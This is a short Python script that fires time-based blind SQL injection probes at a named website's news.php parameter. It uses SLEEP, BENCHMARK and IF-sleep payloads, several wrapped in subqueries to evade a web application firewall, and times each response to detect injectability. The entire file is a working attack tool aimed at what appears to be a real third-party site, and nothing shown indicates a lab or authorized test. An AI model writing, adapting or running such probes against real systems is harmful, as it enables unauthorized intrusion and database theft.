#!/usr/bin/env python3
"""zagroup: try time-based with subquery-wrapped sleep + other extraction"""
import urllib.request, re, time

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def timed(url, timeout=15):
    t0 = time.time()
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        body = r.read().decode("utf-8", "ignore")
        return r.status, time.time() - t0, len(body)
    except urllib.error.HTTPError as e:
        return e.code, time.time() - t0, len(e.read(3000))
    except Exception:
        return 0, time.time() - t0, 0

# baseline timing
code, dt, sz = timed(BASE + "?c=259")
print("baseline: %.2fs size=%d" % (dt, sz))

# time-based probes (sleep wrapped to avoid WAF keyword?)
tests = [
    ("%27%20AND%20SLEEP(3)--%20", "sleep-direct"),
    ("%27%20AND%20sleep(3)--%20", "sleep-lower"),
    ("%27%20AND%20(select%20sleep(3))--%20", "sleep-subq"),
    ("%27%20AND%20(SELECT%20SLEEP(3))--%20", "SLEEP-subq"),
    ("%27%20AND%20(select%201%20from%20(select%20sleep(3))a)--%20", "sleep-nest"),
    ("%27%20AND%20BENCHMARK(10000000,sha1(1))--%20", "benchmark"),
    ("%27%20AND%20(select%20benchmark(5000000,md5(1)))--%20", "benchmark-subq"),
    ("%27%20AND%20IF(1=1,sleep(3),0)--%20", "if-sleep"),
]
for p, tag in tests:
    code, dt, sz = timed(BASE + "?c=259" + p)
    slow = dt > 2.0
    print("%-22s code=%s %.2fs size=%d %s" % (tag, code, dt, sz, "SLOW!" if slow else ""))
